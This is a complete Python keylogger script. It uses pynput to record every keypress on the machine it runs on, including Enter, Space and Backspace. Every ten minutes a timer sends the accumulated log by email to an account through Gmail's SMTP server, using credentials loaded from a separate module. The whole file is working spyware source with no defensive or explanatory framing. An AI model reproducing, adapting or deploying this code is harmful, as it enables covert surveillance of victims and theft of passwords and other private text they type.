from pynput import keyboard as Keyboard
import smtplib
import emailLogin
import threading

class Keylogger:
    def __init__(self, email, password, emailIntervalSeconds):
        self.email = email
        self.password = password
        self.emailIntervalSeconds = emailIntervalSeconds
        self.keyboardLog = ""

    def appendKeyToLog(self, addition):
        self.keyboardLog = self.keyboardLog + str(addition)

    # read keyboard activity when a key is pressed
    def logKeyboardData(self, key):
        try:
            self.appendKeyToLog(key.char)
        except AttributeError:
            # print('User pressed the \'{}\' special key.'.format(key))
            keyToLog = key
            if(key == key.enter):
                keyToLog = ' [ENTER]\n '
            elif(key == key.space):
                keyToLog = ' [SPACE] '
            elif(key == key.backspace):
                keyToLog = ' [BACKSPACE] '
            self.appendKeyToLog(keyToLog)
        
    def sendEmailUsingTLS(self, email, password, message):
            # get secure connection to SMTP server
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()

    # every x seconds, call sendEmailUsingTLS to send keyboard log and clear log
    def triggerEmailSend(self):
        if(self.keyboardLog != ""):
            print(self.keyboardLog)
            emailAddress = self.email
            emailPassword = self.password
            self.sendEmailUsingTLS(emailAddress, emailPassword, self.keyboardLog)
            self.keyboardLog = ""
        else:
            print("Keyboard log is empty. Unable to send log by email. Resetting timer...")
        timer = threading.Timer(self.emailIntervalSeconds, self.triggerEmailSend).start()

    def runKeylogger(self):
        with Keyboard.Listener(on_press=self.logKeyboardData) as listener:
            self.triggerEmailSend()
            listener.join()

emailAddress = emailLogin.getEmailAddress()
emailPassword = emailLogin.getPassword()
# send email of keyboard log every 10 minutes
emailInterval = 600.0

keylogger = Keylogger(emailAddress, emailPassword, emailInterval)
keylogger.runKeylogger()

